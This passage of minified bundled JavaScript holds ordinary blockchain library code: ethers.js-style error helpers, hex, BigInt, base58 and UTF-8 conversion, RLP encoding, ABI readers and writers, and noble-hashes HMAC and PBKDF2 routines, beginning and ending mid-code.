        r.exports.default = e.default
    }(my, my.exports)),
    my.exports
}
var due = fue();
const hue = Zc(due);
function G3(r) {
    return typeof r != "string" ? !1 : hue.isURL(r.toString(), {
        protocols: ["http", "https"],
        require_tld: !1
    })
}
function B0(r) {
    return r === Object(r) && Object.prototype.toString.call(r) !== "[object Array]"
}
function qf(r) {
    return Array.isArray(r)
}
function pue(r) {
    try {
        return !!JSON.parse(r)
    } catch {
        return !1
    }
}
function GD(r) {
    return typeof r == "boolean"
}
function gue(r) {
    return !!r && (r instanceof Cm || r.constructor && r.constructor.name === "BigNumber")
}
function fo(r) {
    return typeof r == "string" || !!r && r.constructor && r.constructor.name === "String"
}
function yue(r) {
    return typeof r == "function"
}
function Ou(r) {
    return typeof r == "string" && !isNaN(parseInt(r, 16)) && /^(0x|)[a-fA-F0-9]+$/.test(r)
}
function Dc(r) {
    return r === null ? !1 : Number.isInteger(Number(r))
}
function KD(r, e) {
    return Object.prototype.hasOwnProperty.call(r, e)
}
function ZD(r, ...e) {
    return e.length && !e.map(t => KD(r, t)).includes(!1)
}
function bue(r) {
    const e = {
        block: r.block_number,
        timestamp: r.block_timestamp,
        contract: r.contract_address,
        name: r.event_name,
        transaction: r.transaction_id,
        result: r.result,
        resourceNode: r.resource_Node || (r._unconfirmed ? "fullNode" : "solidityNode")
    };
    return r._unconfirmed && (e.unconfirmed = r._unconfirmed),
    r._fingerprint && (e.fingerprint = r._fingerprint),
    e
}
function mue(r, {inputs: e}) {
    if (!r.result)
        return r;
    if (B0(r.result))
        for (let t = 0; t < e.length; t++) {
            const o = e[t];
            o.type == "address" && o.name in r.result && (r.result[o.name] = $i + r.result[o.name].substr(2).toLowerCase())
        }
    else
        qf(r.result) && (r.result = r.result.reduce( (t, o, i) => {
            const {name: n, type: s} = e[i];
            return s == "address" && (o = $i + o.substr(2).toLowerCase()),
            t[n] = o,
            t
        }
        , {}));
    return r
}
function xue(r, e, t) {
    let o = r.toString();
    for (; o.length < t; )
        o = e + o;
    return o
}
function co(r) {
    return r !== null && typeof r < "u"
}
async function wue(r=1e3) {
    return new Promise(e => setTimeout(e, r))
}
const vue = Object.freeze(Object.defineProperty({
    __proto__: null,
    hasProperties: ZD,
    hasProperty: KD,
    isArray: qf,
    isBigNumber: gue,
    isBoolean: GD,
    isFunction: yue,
    isHex: Ou,
    isInteger: Dc,
    isJson: pue,
    isNotNullOrUndefined: co,
    isObject: B0,
    isString: fo,
    isValidURL: G3,
    mapEvent: bue,
    padLeft: xue,
    parseEvent: mue,
    sleep: wue
}, Symbol.toStringTag, {
    value: "Module"
}))
  , YD = "6.13.5";
function Tue(r, e, t) {
    const o = e.split("|").map(n => n.trim());
    for (let n = 0; n < o.length; n++)
        switch (e) {
        case "any":
            return;
        case "bigint":
        case "boolean":
        case "number":
        case "string":
            if (typeof r === e)
                return
        }
    const i = new Error(`invalid value for type ${e}`);
    throw i.code = "INVALID_ARGUMENT",
    i.argument = `value.${t}`,
    i.value = r,
    i
}
async function K3(r) {
    const e = Object.keys(r);
    return (await Promise.all(e.map(o => Promise.resolve(r[o])))).reduce( (o, i, n) => (o[e[n]] = i,
    o), {})
}
function tr(r, e, t) {
    for (let o in e) {
        let i = e[o];
        const n = t ? t[o] : null;
        n && Tue(i, n, o),
        Object.defineProperty(r, o, {
            enumerable: !0,
            value: i,
            writable: !1
        })
    }
}
function Vf(r) {
    if (r == null)
        return "null";
    if (Array.isArray(r))
        return "[ " + r.map(Vf).join(", ") + " ]";
    if (r instanceof Uint8Array) {
        const e = "0123456789abcdef";
        let t = "0x";
        for (let o = 0; o < r.length; o++)
            t += e[r[o] >> 4],
            t += e[r[o] & 15];
        return t
    }
    if (typeof r == "object" && typeof r.toJSON == "function")
        return Vf(r.toJSON());
    switch (typeof r) {
    case "boolean":
    case "symbol":
        return r.toString();
    case "bigint":
        return BigInt(r).toString();
    case "number":
        return r.toString();
    case "string":
        return JSON.stringify(r);
    case "object":
        {
            const e = Object.keys(r);
            return e.sort(),
            "{ " + e.map(t => `${Vf(t)}: ${Vf(r[t])}`).join(", ") + " }"
        }
    }
    return "[ COULD NOT SERIALIZE ]"
}
function eR(r, e) {
    return r && r.code === e
}
function XD(r, e, t) {
    let o = r;
    {
        const n = [];
        if (t) {
            if ("message"in t || "code"in t || "name"in t)
                throw new Error(`value will overwrite populated values: ${Vf(t)}`);
            for (const s in t) {
                if (s === "shortMessage")
                    continue;
                const a = t[s];
                n.push(s + "=" + Vf(a))
            }
        }
        n.push(`code=${e}`),
        n.push(`version=${YD}`),
        n.length && (r += " (" + n.join(", ") + ")")
    }
    let i;
    switch (e) {
    case "INVALID_ARGUMENT":
        i = new TypeError(r);
        break;
    case "NUMERIC_FAULT":
    case "BUFFER_OVERRUN":
        i = new RangeError(r);
        break;
    default:
        i = new Error(r)
    }
    return tr(i, {
        code: e
    }),
    t && Object.assign(i, t),
    i.shortMessage == null && tr(i, {
        shortMessage: o
    }),
    i
}
function Mt(r, e, t, o) {
    if (!r)
        throw XD(e, t, o)
}
function pe(r, e, t, o) {
    Mt(r, e, "INVALID_ARGUMENT", {
        argument: t,
        value: o
    })
}
function JD(r, e, t) {
    t == null && (t = ""),
    t && (t = ": " + t),
    Mt(r >= e, "missing argument" + t, "MISSING_ARGUMENT", {
        count: r,
        expectedCount: e
    }),
    Mt(r <= e, "too many arguments" + t, "UNEXPECTED_ARGUMENT", {
        count: r,
        expectedCount: e
    })
}
const Eue = ["NFD", "NFC", "NFKD", "NFKC"].reduce( (r, e) => {
    try {
        if ("test".normalize(e) !== "test")
            throw new Error("bad");
        if (e === "NFD" && "".normalize("NFD") !== "e")
            throw new Error("broken");
        r.push(e)
    } catch {}
    return r
}
, []);
function QD(r) {
    Mt(Eue.indexOf(r) >= 0, "platform missing String.prototype.normalize", "UNSUPPORTED_OPERATION", {
        operation: "String.prototype.normalize",
        info: {
            form: r
        }
    })
}
function el(r, e, t) {
    if (t == null && (t = ""),
    r !== e) {
        let o = t
          , i = "new";
        t && (o += ".",
        i += " " + t),
        Mt(!1, `private constructor; use ${o}from* methods`, "UNSUPPORTED_OPERATION", {
            operation: i
        })
    }
}
function e7(r, e, t) {
    if (r instanceof Uint8Array)
        return t ? new Uint8Array(r) : r;
    if (typeof r == "string" && r.match(/^0x(?:[0-9a-f][0-9a-f])*$/i)) {
        const o = new Uint8Array((r.length - 2) / 2);
        let i = 2;
        for (let n = 0; n < o.length; n++)
            o[n] = parseInt(r.substring(i, i + 2), 16),
            i += 2;
        return o
    }
    pe(!1, "invalid BytesLike value", e || "value", r)
}
function pt(r, e) {
    return e7(r, e, !1)
}
function eo(r, e) {
    return e7(r, e, !0)
}
function ro(r, e) {
    return !(typeof r != "string" || !r.match(/^0x[0-9A-Fa-f]*$/) || typeof e == "number" && r.length !== 2 + 2 * e || e === !0 && r.length % 2 !== 0)
}
function j1(r) {
    return ro(r, !0) || r instanceof Uint8Array
}
const tR = "0123456789abcdef";
function et(r) {
    const e = pt(r);
    let t = "0x";
    for (let o = 0; o < e.length; o++) {
        const i = e[o];
        t += tR[(i & 240) >> 4] + tR[i & 15]
    }
    return t
}
function Ar(r) {
    return "0x" + r.map(e => et(e).substring(2)).join("")
}
function Fp(r) {
    return ro(r, !0) ? (r.length - 2) / 2 : pt(r).length
}
function Ia(r, e, t) {
    const o = pt(r);
    return t != null && t > o.length && Mt(!1, "cannot slice beyond data bounds", "BUFFER_OVERRUN", {
        buffer: o,
        length: o.length,
        offset: t
    }),
    et(o.slice(e ?? 0, t ?? o.length))
}
function Aue(r, e, t) {
    const o = pt(r);
    Mt(e >= o.length, "padding exceeds data length", "BUFFER_OVERRUN", {
        buffer: new Uint8Array(o),
        length: e,
        offset: e + 1
    });
    const i = new Uint8Array(e);
    return i.fill(0),
    i.set(o, e - o.length),
    et(i)
}
function qc(r, e) {
    return Aue(r, e)
}
const q1 = BigInt(0)
  , is = BigInt(1)
  , lA = 9007199254740991;
function Pue(r, e) {
    const t = V1(r, "value")
      , o = BigInt(jn(e, "width"));
    if (Mt(t >> o === q1, "overflow", "NUMERIC_FAULT", {
        operation: "fromTwos",
        fault: "overflow",
        value: r
    }),
    t >> o - is) {
        const i = (is << o) - is;
        return -((~t & i) + is)
    }
    return t
}
function Z3(r, e) {
    let t = Er(r, "value");
    const o = BigInt(jn(e, "width"))
      , i = is << o - is;
    if (t < q1) {
        t = -t,
        Mt(t <= i, "too low", "NUMERIC_FAULT", {
            operation: "toTwos",
            fault: "overflow",
            value: r
        });
        const n = (is << o) - is;
        return (~t & n) + is
    } else
        Mt(t < i, "too high", "NUMERIC_FAULT", {
            operation: "toTwos",
            fault: "overflow",
            value: r
        });
    return t
}
function Hf(r, e) {
    const t = V1(r, "value")
      , o = BigInt(jn(e, "bits"));
    return t & (is << o) - is
}
function Er(r, e) {
    switch (typeof r) {
    case "bigint":
        return r;
    case "number":
        return pe(Number.isInteger(r), "underflow", e || "value", r),
        pe(r >= -9007199254740991 && r <= lA, "overflow", e || "value", r),
        BigInt(r);
    case "string":
        try {
            if (r === "")
                throw new Error("empty string");
            return r[0] === "-" && r[1] !== "-" ? -BigInt(r.substring(1)) : BigInt(r)
        } catch (t) {
            pe(!1, `invalid BigNumberish string: ${t.message}`, e || "value", r)
        }
    }
    pe(!1, "invalid BigNumberish value", e || "value", r)
}
function V1(r, e) {
    const t = Er(r, e);
    return Mt(t >= q1, "unsigned value cannot be negative", "NUMERIC_FAULT", {
        fault: "overflow",
        operation: "getUint",
        value: r
    }),
    t
}
const rR = "0123456789abcdef";
function H1(r) {
    if (r instanceof Uint8Array) {
        let e = "0x0";
        for (const t of r)
            e += rR[t >> 4],
            e += rR[t & 15];
        return BigInt(e)
    }
    return Er(r)
}
function jn(r, e) {
    switch (typeof r) {
    case "bigint":
        return pe(r >= -9007199254740991 && r <= lA, "overflow", e || "value", r),
        Number(r);
    case "number":
        return pe(Number.isInteger(r), "underflow", e || "value", r),
        pe(r >= -9007199254740991 && r <= lA, "overflow", e || "value", r),
        r;
    case "string":
        try {
            if (r === "")
                throw new Error("empty string");
            return jn(BigInt(r), e)
        } catch (t) {
            pe(!1, `invalid numeric string: ${t.message}`, e || "value", r)
        }
    }
    pe(!1, "invalid numeric value", e || "value", r)
}
function Cue(r) {
    return jn(H1(r))
}
function cs(r, e) {
    let o = V1(r, "value").toString(16);
    if (e == null)
        o.length % 2 && (o = "0" + o);
    else {
        const i = jn(e, "width");
        for (Mt(i * 2 >= o.length, `value exceeds width (${i} bytes)`, "NUMERIC_FAULT", {
            operation: "toBeHex",
            fault: "overflow",
            value: r
        }); o.length < i * 2; )
            o = "0" + o
    }
    return "0x" + o
}
function ho(r) {
    const e = V1(r, "value");
    if (e === q1)
        return new Uint8Array([]);
    let t = e.toString(16);
    t.length % 2 && (t = "0" + t);
    const o = new Uint8Array(t.length / 2);
    for (let i = 0; i < o.length; i++) {
        const n = i * 2;
        o[i] = parseInt(t.substring(n, n + 2), 16)
    }
    return o
}
function t7(r) {
    let e = et(j1(r) ? r : ho(r)).substring(2);
    for (; e.startsWith("0"); )
        e = e.substring(1);
    return e === "" && (e = "0"),
    "0x" + e
}
const c1 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
let nm = null;
function Sue(r) {
    if (nm == null) {
        nm = {};
        for (let t = 0; t < c1.length; t++)
            nm[c1[t]] = BigInt(t)
    }
    const e = nm[r];
    return pe(e != null, "invalid base58 value", "letter", r),
    e
}
const Bue = BigInt(0)
  , uA = BigInt(58);
function _ue(r) {
    const e = pt(r);
    let t = H1(e)
      , o = "";
    for (; t; )
        o = c1[Number(t % uA)] + o,
        t /= uA;
    for (let i = 0; i < e.length && !e[i]; i++)
        o = c1[0] + o;
    return o
}
function Iue(r) {
    let e = Bue;
    for (let t = 0; t < r.length; t++)
        e *= uA,
        e += Sue(r[t]);
    return e
}
function Oue(r, e, t, o, i) {
    pe(!1, `invalid codepoint at offset ${e}; ${r}`, "bytes", t)
}
function r7(r, e, t, o, i) {
    if (r === "BAD_PREFIX" || r === "UNEXPECTED_CONTINUE") {
        let n = 0;
        for (let s = e + 1; s < t.length && t[s] >> 6 === 2; s++)
            n++;
        return n
    }
    return r === "OVERRUN" ? t.length - e - 1 : 0
}
function Rue(r, e, t, o, i) {
    return r === "OVERLONG" ? (pe(typeof i == "number", "invalid bad code point for replacement", "badCodepoint", i),
    o.push(i),
    0) : (o.push(65533),
    r7(r, e, t))
}
const Wue = Object.freeze({
    error: Oue,
    ignore: r7,
    replace: Rue
});
function Mue(r, e) {
    e == null && (e = Wue.error);
    const t = pt(r, "bytes")
      , o = [];
    let i = 0;
    for (; i < t.length; ) {
        const n = t[i++];
        if (n >> 7 === 0) {
            o.push(n);
            continue
        }
        let s = null
          , a = null;
        if ((n & 224) === 192)
            s = 1,
            a = 127;
        else if ((n & 240) === 224)
            s = 2,
            a = 2047;
        else if ((n & 248) === 240)
            s = 3,
            a = 65535;
        else {
            (n & 192) === 128 ? i += e("UNEXPECTED_CONTINUE", i - 1, t, o) : i += e("BAD_PREFIX", i - 1, t, o);
            continue
        }
        if (i - 1 + s >= t.length) {
            i += e("OVERRUN", i - 1, t, o);
            continue
        }
        let l = n & (1 << 8 - s - 1) - 1;
        for (let f = 0; f < s; f++) {
            let h = t[i];
            if ((h & 192) != 128) {
                i += e("MISSING_CONTINUE", i, t, o),
                l = null;
                break
            }
            l = l << 6 | h & 63,
            i++
        }
        if (l !== null) {
            if (l > 1114111) {
                i += e("OUT_OF_RANGE", i - 1 - s, t, o, l);
                continue
            }
            if (l >= 55296 && l <= 57343) {
                i += e("UTF16_SURROGATE", i - 1 - s, t, o, l);
                continue
            }
            if (l <= a) {
                i += e("OVERLONG", i - 1 - s, t, o, l);
                continue
            }
            o.push(l)
        }
    }
    return o
}
function Fo(r, e) {
    pe(typeof r == "string", "invalid string value", "str", r),
    e != null && (QD(e),
    r = r.normalize(e));
    let t = [];
    for (let o = 0; o < r.length; o++) {
        const i = r.charCodeAt(o);
        if (i < 128)
            t.push(i);
        else if (i < 2048)
            t.push(i >> 6 | 192),
            t.push(i & 63 | 128);
        else if ((i & 64512) == 55296) {
            o++;
            const n = r.charCodeAt(o);
            pe(o < r.length && (n & 64512) === 56320, "invalid surrogate pair", "str", r);
            const s = 65536 + ((i & 1023) << 10) + (n & 1023);
            t.push(s >> 18 | 240),
            t.push(s >> 12 & 63 | 128),
            t.push(s >> 6 & 63 | 128),
            t.push(s & 63 | 128)
        } else
            t.push(i >> 12 | 224),
            t.push(i >> 6 & 63 | 128),
            t.push(i & 63 | 128)
    }
    return new Uint8Array(t)
}
function Nue(r) {
    return r.map(e => e <= 65535 ? String.fromCharCode(e) : (e -= 65536,
    String.fromCharCode((e >> 10 & 1023) + 55296, (e & 1023) + 56320))).join("")
}
function n7(r, e) {
    return Nue(Mue(r, e))
}
function Due(r) {
    let e = r.toString(16);
    for (; e.length < 2; )
        e = "0" + e;
    return "0x" + e
}
function nR(r, e, t) {
    let o = 0;
    for (let i = 0; i < t; i++)
        o = o * 256 + r[e + i];
    return o
}
function oR(r, e, t, o) {
    const i = [];
    for (; t < e + 1 + o; ) {
        const n = o7(r, t);
        i.push(n.result),
        t += n.consumed,
        Mt(t <= e + 1 + o, "child data too short", "BUFFER_OVERRUN", {
            buffer: r,
            length: o,
            offset: e
        })
    }
    return {
        consumed: 1 + o,
        result: i
    }
}
function o7(r, e) {
    Mt(r.length !== 0, "data too short", "BUFFER_OVERRUN", {
        buffer: r,
        length: 0,
        offset: 1
    });
    const t = o => {
        Mt(o <= r.length, "data short segment too short", "BUFFER_OVERRUN", {
            buffer: r,
            length: r.length,
            offset: o
        })
    }
    ;
    if (r[e] >= 248) {
        const o = r[e] - 247;
        t(e + 1 + o);
        const i = nR(r, e + 1, o);
        return t(e + 1 + o + i),
        oR(r, e, e + 1 + o, o + i)
    } else if (r[e] >= 192) {
        const o = r[e] - 192;
        return t(e + 1 + o),
        oR(r, e, e + 1, o)
    } else if (r[e] >= 184) {
        const o = r[e] - 183;
        t(e + 1 + o);
        const i = nR(r, e + 1, o);
        t(e + 1 + o + i);
        const n = et(r.slice(e + 1 + o, e + 1 + o + i));
        return {
            consumed: 1 + o + i,
            result: n
        }
    } else if (r[e] >= 128) {
        const o = r[e] - 128;
        t(e + 1 + o);
        const i = et(r.slice(e + 1, e + 1 + o));
        return {
            consumed: 1 + o,
            result: i
        }
    }
    return {
        consumed: 1,
        result: Due(r[e])
    }
}
function G1(r) {
    const e = pt(r, "data")
      , t = o7(e, 0);
    return pe(t.consumed === e.length, "unexpected junk after rlp payload", "data", r),
    t.result
}
function iR(r) {
    const e = [];
    for (; r; )
        e.unshift(r & 255),
        r >>= 8;
    return e
}
function i7(r) {
    if (Array.isArray(r)) {
        let o = [];
        if (r.forEach(function(n) {
            o = o.concat(i7(n))
        }),
        o.length <= 55)
            return o.unshift(192 + o.length),
            o;
        const i = iR(o.length);
        return i.unshift(247 + i.length),
        i.concat(o)
    }
    const e = Array.prototype.slice.call(pt(r, "object"));
    if (e.length === 1 && e[0] <= 127)
        return e;
    if (e.length <= 55)
        return e.unshift(128 + e.length),
        e;
    const t = iR(e.length);
    return t.unshift(183 + t.length),
    t.concat(e)
}
const sR = "0123456789abcdef";
function Rd(r) {
    let e = "0x";
    for (const t of i7(r))
        e += sR[t >> 4],
        e += sR[t & 15];
    return e
}
function Fue(r) {
    const e = pt(r, "randomBytes");
    e[6] = e[6] & 15 | 64,
    e[8] = e[8] & 63 | 128;
    const t = et(e);
    return [t.substring(2, 10), t.substring(10, 14), t.substring(14, 18), t.substring(18, 22), t.substring(22, 34)].join("-")
}
const po = 32
  , fA = new Uint8Array(po)
  , Uue = ["then"]
  , om = {}
  , s7 = new WeakMap;
function Dl(r) {
    return s7.get(r)
}
function aR(r, e) {
    s7.set(r, e)
}
function wp(r, e) {
    const t = new Error(`deferred error during ABI decoding triggered accessing ${r}`);
    throw t.error = e,
    t
}
function dA(r, e, t) {
    return r.indexOf(null) >= 0 ? e.map( (o, i) => o instanceof Wd ? dA(Dl(o), o, t) : o) : r.reduce( (o, i, n) => {
        let s = e.getValue(i);
        return i in o || (t && s instanceof Wd && (s = dA(Dl(s), s, t)),
        o[i] = s),
        o
    }
    , {})
}
var Jf;
const Gf = class Gf extends Array {
    constructor(...t) {
        const o = t[0];
        let i = t[1]
          , n = (t[2] || []).slice()
          , s = !0;
        o !== om && (i = t,
        n = [],
        s = !1);
        super(i.length);
        ft(this, Jf);
        i.forEach( (f, h) => {
            this[h] = f
        }
        );
        const a = n.reduce( (f, h) => (typeof h == "string" && f.set(h, (f.get(h) || 0) + 1),
        f), new Map);
        if (aR(this, Object.freeze(i.map( (f, h) => {
            const p = n[h];
            return p != null && a.get(p) === 1 ? p : null
        }
        ))),
        He(this, Jf, []),
        Ae(this, Jf) == null && Ae(this, Jf),
        !s)
            return;
        Object.freeze(this);
        const l = new Proxy(this,{
            get: (f, h, p) => {
                if (typeof h == "string") {
                    if (h.match(/^[0-9]+$/)) {
                        const v = jn(h, "%index");
                        if (v < 0 || v >= this.length)
                            throw new RangeError("out of result range");
                        const T = f[v];
                        return T instanceof Error && wp(`index ${v}`, T),
                        T
                    }
                    if (Uue.indexOf(h) >= 0)
                        return Reflect.get(f, h, p);
                    const b = f[h];
                    if (b instanceof Function)
                        return function(...v) {
                            return b.apply(this === p ? f : this, v)
                        }
                        ;
                    if (!(h in f))
                        return f.getValue.apply(this === p ? f : this, [h])
                }
                return Reflect.get(f, h, p)
            }
        });
        return aR(l, Dl(this)),
        l
    }
    toArray(t) {
        const o = [];
        return this.forEach( (i, n) => {
            i instanceof Error && wp(`index ${n}`, i),
            t && i instanceof Gf && (i = i.toArray(t)),
            o.push(i)
        }
        ),
        o
    }
    toObject(t) {
        const o = Dl(this);
        return o.reduce( (i, n, s) => (Mt(n != null, `value at index ${s} unnamed`, "UNSUPPORTED_OPERATION", {
            operation: "toObject()"
        }),
        dA(o, this, t)), {})
    }
    slice(t, o) {
        t == null && (t = 0),
        t < 0 && (t += this.length,
        t < 0 && (t = 0)),
        o == null && (o = this.length),
        o < 0 && (o += this.length,
        o < 0 && (o = 0)),
        o > this.length && (o = this.length);
        const i = Dl(this)
          , n = []
          , s = [];
        for (let a = t; a < o; a++)
            n.push(this[a]),
            s.push(i[a]);
        return new Gf(om,n,s)
    }
    filter(t, o) {
        const i = Dl(this)
          , n = []
          , s = [];
        for (let a = 0; a < this.length; a++) {
            const l = this[a];
            l instanceof Error && wp(`index ${a}`, l),
            t.call(o, l, a, this) && (n.push(l),
            s.push(i[a]))
        }
        return new Gf(om,n,s)
    }
    map(t, o) {
        const i = [];
        for (let n = 0; n < this.length; n++) {
            const s = this[n];
            s instanceof Error && wp(`index ${n}`, s),
            i.push(t.call(o, s, n, this))
        }
        return i
    }
    getValue(t) {
        const o = Dl(this).indexOf(t);
        if (o === -1)
            return;
        const i = this[o];
        return i instanceof Error && wp(`property ${JSON.stringify(t)}`, i.error),
        i
    }
    static fromItems(t, o) {
        return new Gf(om,t,o)
    }
}
;
Jf = new WeakMap;
let Wd = Gf;
function cR(r) {
    let e = ho(r);
    return Mt(e.length <= po, "value out-of-bounds", "BUFFER_OVERRUN", {
        buffer: e,
        length: po,
        offset: e.length
    }),
    e.length !== po && (e = eo(Ar([fA.slice(e.length % po), e]))),
    e
}
class Ka {
    constructor(e, t, o, i) {
        we(this, "name");
        we(this, "type");
        we(this, "localName");
        we(this, "dynamic");
        tr(this, {
            name: e,
            type: t,
            localName: o,
            dynamic: i
        }, {
            name: "string",
            type: "string",
            localName: "string",
            dynamic: "boolean"
        })
    }
    _throwError(e, t) {
        pe(!1, e, this.localName, t)
    }
}
var Ra, Gl, Qf, Sm;
class hA {
    constructor() {
        ft(this, Qf);
        ft(this, Ra);
        ft(this, Gl);
        He(this, Ra, []),
        He(this, Gl, 0)
    }
    get data() {
        return Ar(Ae(this, Ra))
    }
    get length() {
        return Ae(this, Gl)
    }
    appendWriter(e) {
        return Dt(this, Qf, Sm).call(this, eo(e.data))
    }
    writeBytes(e) {
        let t = eo(e);
        const o = t.length % po;
        return o && (t = eo(Ar([t, fA.slice(o)]))),
        Dt(this, Qf, Sm).call(this, t)
    }
    writeValue(e) {
        return Dt(this, Qf, Sm).call(this, cR(e))
    }
    writeUpdatableValue() {
        const e = Ae(this, Ra).length;
        return Ae(this, Ra).push(fA),
        He(this, Gl, Ae(this, Gl) + po),
        t => {
            Ae(this, Ra)[e] = cR(t)
        }
    }
}
Ra = new WeakMap,
Gl = new WeakMap,
Qf = new WeakSet,
Sm = function(e) {
    return Ae(this, Ra).push(e),
    He(this, Gl, Ae(this, Gl) + e.length),
    e.length
}
;
var Oo, ri, Kl, Zl, Fc, wu, gA, a7;
const M4 = class M4 {
    constructor(e, t, o) {
        ft(this, wu);
        we(this, "allowLoose");
        ft(this, Oo);
        ft(this, ri);
        ft(this, Kl);
        ft(this, Zl);
        ft(this, Fc);
        tr(this, {
            allowLoose: !!t
        }),
        He(this, Oo, eo(e)),
        He(this, Kl, 0),
        He(this, Zl, null),
        He(this, Fc, o ?? 1024),
        He(this, ri, 0)
    }
    get data() {
        return et(Ae(this, Oo))
    }
    get dataLength() {
        return Ae(this, Oo).length
    }
    get consumed() {
        return Ae(this, ri)
    }
    get bytes() {
        return new Uint8Array(Ae(this, Oo))
    }
    subReader(e) {
        const t = new M4(Ae(this, Oo).slice(Ae(this, ri) + e),this.allowLoose,Ae(this, Fc));
        return He(t, Zl, this),
        t
    }
    readBytes(e, t) {
        let o = Dt(this, wu, a7).call(this, 0, e, !!t);
        return Dt(this, wu, gA).call(this, e),
        He(this, ri, Ae(this, ri) + o.length),
        o.slice(0, e)
    }
    readValue() {
        return H1(this.readBytes(po))
    }
    readIndex() {
        return Cue(this.readBytes(po))
    }
}
;
Oo = new WeakMap,
ri = new WeakMap,
Kl = new WeakMap,
Zl = new WeakMap,
Fc = new WeakMap,
wu = new WeakSet,
gA = function(e) {
    var t;
    if (Ae(this, Zl))
        return Dt(t = Ae(this, Zl), wu, gA).call(t, e);
    He(this, Kl, Ae(this, Kl) + e),
    Mt(Ae(this, Fc) < 1 || Ae(this, Kl) <= Ae(this, Fc) * this.dataLength, `compressed ABI data exceeds inflation ratio of ${Ae(this, Fc)} ( see: https://github.com/ethers-io/ethers.js/issues/4537 )`, "BUFFER_OVERRUN", {
        buffer: eo(Ae(this, Oo)),
        offset: Ae(this, ri),
        length: e,
        info: {
            bytesRead: Ae(this, Kl),
            dataLength: this.dataLength
        }
    })
}
,
a7 = function(e, t, o) {
    let i = Math.ceil(t / po) * po;
    return Ae(this, ri) + i > Ae(this, Oo).length && (this.allowLoose && o && Ae(this, ri) + t <= Ae(this, Oo).length ? i = t : Mt(!1, "data out-of-bounds", "BUFFER_OVERRUN", {
        buffer: eo(Ae(this, Oo)),
        length: Ae(this, Oo).length,
        offset: Ae(this, ri) + i
    })),
    Ae(this, Oo).slice(Ae(this, ri), Ae(this, ri) + i)
}
;
let pA = M4;
function ai(r) {
    if (!Number.isSafeInteger(r) || r < 0)
        throw new Error(`Wrong positive integer: ${r}`)
}
function Y3(r, ...e) {
    if (!(r instanceof Uint8Array))
        throw new Error("Expected Uint8Array");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error(`Expected Uint8Array of length ${e}, not of length=${r.length}`)
}
function c7(r) {
    if (typeof r != "function" || typeof r.create != "function")
        throw new Error("Hash should be wrapped by utils.wrapConstructor");
    ai(r.outputLen),
    ai(r.blockLen)
}
function Md(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function l7(r, e) {
    Y3(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error(`digestInto() expects output buffer of length at least ${t}`)
}
const W2 = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const u7 = r => r instanceof Uint8Array
  , Bm = r => new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength / 4))
  , _m = r => new DataView(r.buffer,r.byteOffset,r.byteLength)
  , Is = (r, e) => r << 32 - e | r >>> e
  , kue = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
if (!kue)
    throw new Error("Non little-endian hardware is not supported");
const Lue = async () => {}
;
async function lR(r, e, t) {
    let o = Date.now();
    for (let i = 0; i < r; i++) {
        t(i);
        const n = Date.now() - o;
        n >= 0 && n < e || (await Lue(),
        o += n)
    }
}
function $ue(r) {
    if (typeof r != "string")
        throw new Error(`utf8ToBytes expected string, got ${typeof r}`);
    return new Uint8Array(new TextEncoder().encode(r))
}
function Nd(r) {
    if (typeof r == "string" && (r = $ue(r)),
    !u7(r))
        throw new Error(`expected Uint8Array, got ${typeof r}`);
    return r
}
function zue(...r) {
    const e = new Uint8Array(r.reduce( (o, i) => o + i.length, 0));
    let t = 0;
    return r.forEach(o => {
        if (!u7(o))
            throw new Error("Uint8Array expected");
        e.set(o, t),
        t += o.length
    }
    ),
    e
}
let X3 = class {
    clone() {
        return this._cloneInto()
    }
}
;
const jue = {}.toString;
function f7(r, e) {
    if (e !== void 0 && jue.call(e) !== "[object Object]")
        throw new Error("Options should be object or undefined");
    return Object.assign(r, e)
}
function K1(r) {
    const e = o => r().update(Nd(o)).digest()
      , t = r();
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = () => r(),
    e
}
function que(r=32) {
    if (W2 && typeof W2.getRandomValues == "function")
        return W2.getRandomValues(new Uint8Array(r));
    throw new Error("crypto.getRandomValues must be defined")
}
let d7 = class extends X3 {
    constructor(e, t) {
        super(),
        this.finished = !1,
        this.destroyed = !1,
        c7(e);
        const o = Nd(t);
        if (this.iHash = e.create(),
        typeof this.iHash.update != "function")
            throw new Error("Expected instance of class which extends utils.Hash");
        this.blockLen = this.iHash.blockLen,
        this.outputLen = this.iHash.outputLen;
        const i = this.blockLen
          , n = new Uint8Array(i);
        n.set(o.length > i ? e.create().update(o).digest() : o);
        for (let s = 0; s < n.length; s++)
            n[s] ^= 54;
        this.iHash.update(n),
        this.oHash = e.create();
        for (let s = 0; s < n.length; s++)
            n[s] ^= 106;
        this.oHash.update(n),
        n.fill(0)
    }
    update(e) {
        return Md(this),
        this.iHash.update(e),
        this
    }
    digestInto(e) {
        Md(this),
        Y3(e, this.outputLen),
        this.finished = !0,
        this.iHash.digestInto(e),
        this.oHash.update(e),
        this.oHash.digestInto(e),
        this.destroy()
    }
    digest() {
        const e = new Uint8Array(this.oHash.outputLen);
        return this.digestInto(e),
        e
    }
    _cloneInto(e) {
        e || (e = Object.create(Object.getPrototypeOf(this), {}));
        const {oHash: t, iHash: o, finished: i, destroyed: n, blockLen: s, outputLen: a} = this;
        return e = e,
        e.finished = i,
        e.destroyed = n,
        e.blockLen = s,
        e.outputLen = a,
        e.oHash = t._cloneInto(e.oHash),
        e.iHash = o._cloneInto(e.iHash),
        e
    }
    destroy() {
        this.destroyed = !0,
        this.oHash.destroy(),
        this.iHash.destroy()
    }
}
;
const Z1 = (r, e, t) => new d7(r,e).update(t).digest();
Z1.create = (r, e) => new d7(r,e);
function Vue(r, e, t, o) {
    c7(r);
    const i = f7({
        dkLen: 32,
        asyncTick: 10
    }, o)
      , {c: n, dkLen: s, asyncTick: a} = i;
    if (ai(n),
    ai(s),
    ai(a),
    n < 1)
        throw new Error("PBKDF2: iterations (c) should be >= 1");
    const l = Nd(e)
      , f = Nd(t)
      , h = new Uint8Array(s)
      , p = Z1.create(r, l)
      , b = p._cloneInto().update(f);
    return {
        c: n,
